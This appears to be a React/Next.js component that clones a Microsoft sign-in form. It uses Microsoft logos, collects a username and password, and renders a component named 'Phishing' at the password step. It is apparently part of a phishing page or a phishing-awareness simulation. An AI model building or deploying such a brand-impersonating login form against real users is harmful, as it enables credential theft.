"use client";

import Image from "next/image";
import React, { useState, createContext } from "react";

import styles from "./styles/template.module.css";
import LogoNR from "./images/bannerlogo.png";
import LogoMS from "./images/logo.svg";

import FormAnimation from "./FormAnimation";
import Options from "./Options";
import Phishing from "./Phishing";

export interface IFormStatus {
  view: "password" | "email";
  username: string;
  password: string;
}

interface CFormStatus {
  status: IFormStatus;
  setFormStatus: React.Dispatch<React.SetStateAction<IFormStatus>>;
}

export const FormContext = createContext<CFormStatus | null>(null);

export default function FormMicrosoft() {
  const [formStatus, setFormStatus] = useState<IFormStatus>({
    view: "email",
    username: "",
    password: "",
  });

  return (
    <FormContext.Provider value={{ status: formStatus, setFormStatus }}>
      <form
        method="POST"
        action="/api/form"
        onSubmit={(e) => e.preventDefault()}
      >
        <div className={styles["form-microsoft-container"]}>
          <div>
            <Image
              width={108}
              height={24}
              src={formStatus.view === "email" ? LogoMS : LogoNR}
              alt="Microsoft Banner"
            />
          </div>
          <FormAnimation />
        </div>

        {formStatus.view === "email" && <Options />}
        {formStatus.view === "password" && <Phishing />}
        {formStatus.view === "password" && <div className={styles.bg}></div>}
      </form>
    </FormContext.Provider>
  );
}
